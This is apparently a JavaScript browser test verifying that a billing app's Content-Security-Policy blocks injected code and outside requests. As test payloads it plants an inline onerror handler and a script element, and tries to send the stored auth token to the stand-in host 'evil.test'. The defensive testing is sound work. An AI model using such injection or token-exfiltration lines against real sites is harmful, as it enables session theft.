/* The browser rule (Content-Security-Policy, 12 Oct 2026): the app, the vendor page and the admin dashboard run only their own
   script files and the few small scripts written into each page (allowed by exact digest). So even if code were ever slipped
   into a name or note, the browser would refuse to run it. Checks: the app starts and works with nothing blocked; a planted
   inline handler and a planted script don't run; a request to any other site is refused; each page's digests are current.
   Run: node tests/csp.app.test.js */
const fs = require('fs'), path = require('path');
const { appHtml, launch, ok, done, ROOT } = require('./browser');
const { withCsp, PAGES } = require('../tools/stamp');
const html = appHtml('S,appUnlock,setTab,addToBill,openSettings');
(async () => {
  for (const f of PAGES) { const h = fs.readFileSync(path.join(ROOT, f), 'utf8'); ok(withCsp(h) === h && /<meta http-equiv="Content-Security-Policy"/.test(h) && !/ on[a-z]+="/.test(h), `${f}: the rule is there, its script digests are current, no inline event handlers`); }
  const b = await launch(), ctx = await b.newContext({ viewport: { width: 390, height: 844 } }), p = await ctx.newPage(); const errs = [];
  p.on('pageerror', e => errs.push(e.message));
  await ctx.route('https://rb.test/**', r => r.fulfill({ body: html, contentType: 'text/html' }));
  await ctx.route('https://evil.test/**', r => r.fulfill({ body: 'stolen' }));
  await ctx.route('https://script.google.com/**', r => r.fulfill({ contentType: 'application/json', body: JSON.stringify({ ok: true, shop: 'main', rev: '1', items: [{ id: 'i1', name: 'PP Bag', unit: 'kg', buy: 1, sell: 2 }], config: { shopName: 'Gupta', mode: 'live' }, sv: 46, me: { name: 'M', role: 'owner', personal: true, prefs: {} } }) }));
  await p.addInitScript(() => { window.__v = []; document.addEventListener('securitypolicyviolation', e => window.__v.push(e.violatedDirective + ' ' + (e.blockedURI || ''))); localStorage.setItem('rb_auth', JSON.stringify({ tok: 't', by: 'M', role: 'owner', personal: true, pinH: 'x', pinS: 'AAAA' })); });
  await p.goto('https://rb.test/'); await p.waitForTimeout(1500); await p.evaluate(() => T.appUnlock());
  await p.evaluate(() => { T.addToBill('i1'); T.setTab('bill'); }); await p.waitForTimeout(300); await p.evaluate(() => T.openSettings()); await p.waitForTimeout(600);
  ok(await p.evaluate(() => T.S.items.length === 1 && T.S.bill.length === 1) && (await p.evaluate(() => window.__v)).length === 0, 'the app starts, loads its list, makes a bill and opens Settings with nothing blocked');
  await p.evaluate(() => { const d = document.createElement('div'); d.innerHTML = '<img src="data:x" onerror="window.__ran1=1">'; document.body.appendChild(d);
    const s = document.createElement('script'); s.textContent = 'window.__ran2=1'; document.body.appendChild(s); });
  await p.waitForTimeout(300);
  ok(await p.evaluate(() => !window.__ran1 && !window.__ran2) && (await p.evaluate(() => window.__v)).some(v => /script-src/.test(v)), 'planted code (an inline handler, a script) is refused by the browser');
  const leak = await p.evaluate(() => fetch('https://evil.test/x?d=' + encodeURIComponent(localStorage.rb_auth)).then(() => 'sent', () => 'blocked'));
  ok(leak === 'blocked', 'sending data to any other site is refused (connect-src)');
  ok(!errs.length, 'no page errors' + (errs.length ? ': ' + errs.join(' | ') : ''));
  await b.close(); done();
})();
